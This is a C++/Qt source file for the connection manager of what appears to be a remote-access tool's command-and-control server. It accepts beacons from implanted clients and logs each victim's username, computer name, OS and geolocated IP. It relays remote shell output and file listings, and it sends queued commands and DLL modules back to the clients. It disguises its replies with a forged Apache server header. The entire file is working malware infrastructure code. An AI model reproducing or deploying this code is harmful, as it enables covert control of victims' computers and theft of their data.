// Copyright (c) Nouman Tajik [github.com/tajiknomi]
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.



#include "connectionManager.h"
#include <QDebug>
#include <QTime>
#include <QHash>
#include "json.h"
#include <QRegularExpression>
#include <QtNetwork>


ConnectionManager::ConnectionManager(QObject *parent) : QObject(parent), mNumOfClients{0} {

    QObject::connect(&server, &QTcpServer::newConnection, this, &ConnectionManager::onIncommingConnection);
}

void ConnectionManager::setConnectionTimeOut_sec(const size_t &timeout_sec){

    if(timeout_sec != 0){
        clientTimeout_ms = timeout_sec * 1000;
    }
    else{   // Default is 60 sec
        clientTimeout_ms = 60 * 1000;
    }
}

void ConnectionManager::onIncommingConnection() {

    QTcpSocket *newSocket = server.nextPendingConnection();
    if(newSocket == nullptr) {
        return;
    }
    auto tempSocketData{std::make_shared<socketMetaData>()};

    QObject::connect(newSocket, &QAbstractSocket::disconnected, this, [newSocket](){newSocket->deleteLater();});
    QObject::connect(newSocket, &QIODevice::readyRead, this, [=]() {this->onRecvData(newSocket, tempSocketData);} );
}

void ConnectionManager::onRecvData(QTcpSocket *socket, std::shared_ptr<socketMetaData> tempSocketData){

    if(tempSocketData->totalBytesToRead == 0){          // If it is the start of the HTTP Packet
        tempSocketData->numOfBytesRead = socket->bytesAvailable();
        tempSocketData->buffer.append(socket->readAll());

        const QString recvPacket (QString::fromStdString(tempSocketData->buffer.toStdString()));
        const QString contentLength = extractContentLength(recvPacket);
        if(contentLength.isEmpty()){
            qDebug() << "Content-length not found!";
            return;
        }
        if(!isHttpPacket(recvPacket)){
            qDebug() << "Not HTTP packet!";
            return;
        }
        tempSocketData->totalBytesToRead = extractPacketSize(recvPacket, contentLength);
    }
    else {                           // If it is remaining portion of the already recieved HTTP Packet
        tempSocketData->numOfBytesRead += socket->bytesAvailable();
        tempSocketData->buffer.append(socket->readAll());
    }
    if(tempSocketData->totalBytesToRead > tempSocketData->numOfBytesRead){  // If HTTP Packet is not yet fully downloaded then return to the event loop
        return;
    }

    tempSocketData->totalBytesToRead = 0;
    tempSocketData->numOfBytesRead = 0;
    QString jsonData = decodeBase64Content(tempSocketData->buffer);

    if(! jsonData.isEmpty()) {
        QString id = json_ExtractValue(jsonData, "id");    // Extract "id" from decoded data
        if(id.isEmpty()){   // If their is no "id" field, then we cannot determine which client sends the packet. So simply close connection, cleanup & return
            qDebug() << "Couldn't extract 'id'";
            // qDebug() << "Number of active client: " << mNumOfClients;
            socket->close();
            tempSocketData->buffer.clear();
            return;
        }

        QString sourceIp {socket->peerAddress().toString()};
        if(configManager.getBlackListedIPs().contains(sourceIp)){
            qDebug() << sourceIp << " is blacklisted!";
            socket->close();
            tempSocketData->buffer.clear();
            return;
        }

        QString destIp {server.serverAddress().toString()};
        handleClientInstruction(id, sourceIp, destIp, jsonData);
        setClientTimer(id, sourceIp, jsonData);
        QString replyToClient = constructResponseToRequest(id);

        if(replyToClient.isEmpty()){        // nothing to send to client
            return;
        }
        socket->write(replyToClient.toStdString().c_str(), replyToClient.length());

        // Input to log file
        //            sourceIp.swap(destIp);
        //            tmp += sourceIp + "\t\t";
        //            tmp += destIp + "\t\t";
        //            tmp += commandToSend;
        //            configManager.logInput(tmp);
    }

    socket->close();
    tempSocketData->buffer.clear();
}

QString ConnectionManager::extractContentLength(const QString &packet){

    static QRegularExpression ContentLengthRegex("Content-Length:\\s*(\\d+)");
    // Match the pattern against the string
    QRegularExpressionMatch match = ContentLengthRegex.match(packet);
    if (match.hasMatch()){
        return { match.captured(1) };
    }
    else {
        return QString();
    }
}

bool ConnectionManager::isHttpPacket(const QString &packet){

    int found = packet.mid(0, packet.indexOf("\r\n\r\n")).length();
    if(found == -1){ // Verfiy that the incomming packet is HTTP Packet
        // Header section of HTTP is always indicated by an empty field line, resulting in the transmission of TWO consecutive CR-LF pairs, if not, then its not HTTP packet
        qDebug() << "Incoming packet is not http packet!";
        return false;
    }
    return true;
}

size_t ConnectionManager::extractPacketSize(const QString &packet, const QString &contentLength){

    int found = packet.mid(0, packet.indexOf("\r\n\r\n")).length();
    size_t httpPacketLengthWithoutData = found + QString("\r\n\r\n").length();
    return httpPacketLengthWithoutData + contentLength.toInt();
}

QString ConnectionManager::decodeBase64Content(const QString &packet){

    const QString searchString = "\r\n\r\n";
    const int index = packet.indexOf(searchString);
    QString base64Data = packet.mid(index + searchString.length());
    QByteArray byteArray;

    if(base64Data.isEmpty()){   // if the http packet doesn't contain any data
        qDebug() << "No data arrived";
    }
    // If it contains data but lack base64 charactersfileManagerResponse
    else if((byteArray = QByteArray::fromBase64(base64Data.toUtf8(), QByteArray::AbortOnBase64DecodingErrors)).isEmpty()){
        qDebug() << "Error while decoding base64 data";
    }
    else{
        return QString::fromUtf8(byteArray);
    }
    return QString();
}

void ConnectionManager::registerTaskForClient(const QString &data){

    QString id { json_ExtractValue(data, "id") };
    QString instruction { json_RemoveValue(data, "id") };
    pendingClientTasks.insert(id, instruction);
}

unsigned int ConnectionManager::NumOfClients() const{
    return mNumOfClients;
}

int ConnectionManager::startServer(const quint16 &port){

    QString addr {"0.0.0.0"};

    if(!configManager.getDataServerIP().isEmpty()){   // if config file is available
        QStringList dnsList { configManager.getDnsList() };
        addr = ConfigurationManager::GetServerIP(dnsList); // Extract the C2 server IP
    }

    else { addr = configManager.getDataServerIP(); } // For default config, data server is the same as C2 server

    if(addr.isNull()){
        QString promptMsg = "Server is unable to access the internet at this time, try again";
        emit displayPromptQML("Server", promptMsg);
        return -1;
    }
    else if (!server.listen(QHostAddress{addr}, port) || !server.isListening()){
        QString promptMsg =  "Cannot connect on" + addr + ":" + QString::number(port) + "\n";
        promptMsg += "The listening port maybe in use by some other service";
        emit displayPromptQML("Server", promptMsg);
        return -1;
    }

    qDebug() << "Listening on " << addr + ":" + QString::number(port);
    emit sendDataServerIP(configManager.getDataServerIP());
    return 0;
}

void ConnectionManager::stopServer(){
    server.close();
    qDebug() << QDateTime::currentDateTime().time().toString() << ": The server no longer listen for new incoming connections";
}

void ConnectionManager::getCountryLocationFromIP(const std::string& ipAddress, const std::string& clientData) {

    std::string apiUrl = "http://ip-api.com/json/" + ipAddress;

    // Create a QNetworkAccessManager instance to handle the network request
    QNetworkAccessManager* manager = new QNetworkAccessManager;

    // Connect signals to slots to capture the response
    QObject::connect(manager, &QNetworkAccessManager::finished, manager, [this, clientData, manager](QNetworkReply* reply) {

        if (reply->error() == QNetworkReply::NoError) {

            QByteArray data = reply->readAll();

            // Parse the JSON response
            QJsonDocument jsonDocument = QJsonDocument::fromJson(data);
            if (!jsonDocument.isNull() && jsonDocument.isObject()) {
                QJsonObject jsonObject = jsonDocument.object();
                QString country = jsonObject.value("country").toString();
                QString clientDataQString = QString::fromStdString(clientData);
                if(country.isEmpty()) { clientDataQString += "NULL"; }
                else { clientDataQString += country; }
                emit this->addClient(clientDataQString);
            }
        }
        else {
            qDebug() << "Error: " << reply->errorString();
            emit this->addClient(clientData.c_str());
        }

        // Cleanup
        reply->deleteLater();
        manager->deleteLater();
    });

    // Send the GET request
    manager->get(QNetworkRequest(QUrl(apiUrl.c_str())));
}

void ConnectionManager::handleClientInstruction(const QString &id, const QString &sourceIp, const QString destIp, const QString &jsonData){

    QString instruction;
    if(!(instruction = json_ExtractValue(jsonData, "log")).isEmpty()){
        QString logData {instruction};
        QString clientUsername = json_ExtractValue(jsonData, "username");
        emit displayPromptQML(clientUsername, logData);
        // save to log.txt file
        QString tmp = sourceIp + "\t\t";
        tmp += destIp + "\t\t";
        static QRegularExpression newlineRegex("[\r\n]+");
        logData = logData.replace(newlineRegex, "\\n"); // Replace all newline characters to literal "\n" before writing to log.txt file
        tmp += logData;
        configManager.logInput(tmp);
        tmp.clear();
    }
    else if(!(instruction = json_ExtractValue(jsonData, "dirList")).isEmpty()){              // Handle the filemanager response here
        QString dirList {instruction};
        emit fileManagerResponse(id, dirList);
    }
    else if(!(instruction = json_ExtractValue(jsonData, "shellResponse")).isEmpty()){
        QString shellData {instruction};
        emit shellResponse(id, shellData);
    }
    else if(!(instruction = json_ExtractValue(jsonData, "resourceRequired")).isEmpty()){            // Handle missing dll response here
        QString fileToSend{instruction};
        const QString filePath { ConfigurationManager::clientModulesPath() + fileToSend };
        QByteArray fileContent = ConfigurationManager::readFile(filePath, QIODevice::ReadOnly);      // Read dll file from current directory
        if(fileContent.isEmpty()){
            emit displayPromptQML("Server", (QCoreApplication::applicationDirPath() + "/" + ConfigurationManager::moduleDir + "/" +  fileToSend) + " is missing, the client is asking for this file");
        }
        else{
            QByteArray fileContentB64 = fileContent.toBase64();
            if(fileContentB64.isEmpty()){
                qDebug() << "Couldn't read file";
            }
            QVector<QString> dataToSend;
            dataToSend.push_back("id");
            dataToSend.push_back(id);

            dataToSend.push_back("mode");
            dataToSend.push_back("grabFile");

            dataToSend.push_back("filename");
            dataToSend.push_back(fileToSend);

            dataToSend.push_back("base64Data");
            dataToSend.push_back(fileContentB64);
            registerTaskForClient(to_json(dataToSend));
        }
    }
}

void ConnectionManager::setClientTimer (const QString &id, const QString &sourceIp, const QString &jsonData){

    if(!pingTimers.contains(id)){   // if the corresponding timer doesn't exist, then it means that the "id" is new and we had to create timer for it
        QTimer *pingTimer = new QTimer;
        pingTimers.insert(id, pingTimer);
        pingTimer->start(clientTimeout_ms);
        QObject::connect(pingTimer, &QTimer::timeout, this, [this,id]() {    // On timeout, stop the timer and remove the id (i.e. remove the client)
            qDebug() << "Timeout!";
            qDebug() << "Client of ID = " << id << " removed";
            QTimer *pingTimer = pingTimers.value(id);
            pingTimer->stop();
            pingTimer->deleteLater();
            pingTimers.remove(id);
            emit removeClient(id);
            --mNumOfClients;
        } );
        QString recievedData {jsonData} ;
        QString clientData;
        clientData =  json_ExtractValue(recievedData, "id") + "***";
        clientData += json_ExtractValue(recievedData, "username") + "***";
        clientData += json_ExtractValue(recievedData, "computerName") + "***";
        clientData += json_ExtractValue(recievedData, "OSversion");
        clientData += json_ExtractValue(recievedData, "OSname") + "***";
        clientData += sourceIp.toStdString() + "***";
        getCountryLocationFromIP(sourceIp.toStdString(), clientData.toStdString());

        ++mNumOfClients;
        // qDebug() << "Number of active client: " << mNumOfClients;
    }
    else {      // if id already exists, reset the timer of the corresponding id
        //    qDebug() << id << " already exists";
        QTimer *pingTimer = pingTimers.value(id);
        pingTimer->start(clientTimeout_ms);        // reset the timer
    }
}

QString ConnectionManager::constructResponseToRequest(const QString &id){

    // If there is a command to be send to the client, it should be here
    QString replyToClient {"HTTP/1.1 200 OK\r\nServer: Apache 2.4.56\r\nContent-Encoding: base64\r\nContent-Type: application/json\r\n"};

    // This will extract the most recent command associated with the key (Ideally it should be in FIFO order)
    QByteArray commandToSend { pendingClientTasks.value(id).toUtf8() };

    if(commandToSend.isEmpty()){
        return QString(); // Don't send anything
    }
    pendingClientTasks.remove(id, commandToSend); // remove the instruction now as we have collect it

    QString commandToSendB64 = commandToSend.toBase64();
    size_t contentLength = commandToSendB64.length();
    replyToClient += "Content-Length: " + QString::number(contentLength) + "\r\n";
    replyToClient += "Connection: close\r\n\r\n";
    replyToClient += commandToSendB64;

    return replyToClient;
}
